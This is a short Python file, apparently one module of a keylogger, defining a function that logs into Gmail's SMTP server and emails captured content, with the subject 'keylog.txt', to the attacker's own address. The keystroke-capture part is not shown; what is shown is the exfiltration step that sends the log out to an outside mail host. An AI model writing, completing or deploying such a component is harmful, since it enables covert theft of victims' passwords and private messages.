import smtplib
from email.mime.text import MIMEText

def send_email(email, password, content):
    # Create an email message
    message = MIMEText(content)
    message["Subject"] = 'keylog.txt'
    message["From"] = email
    message["To"] = email

    try:
        # Connect to the SMTP server and send the email
        with smtplib.SMTP("smtp.gmail.com", 587) as server:  # Change for non-Gmail providers
            server.starttls()
            server.login(email, password)
            server.send_message(message)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email:\n{e}")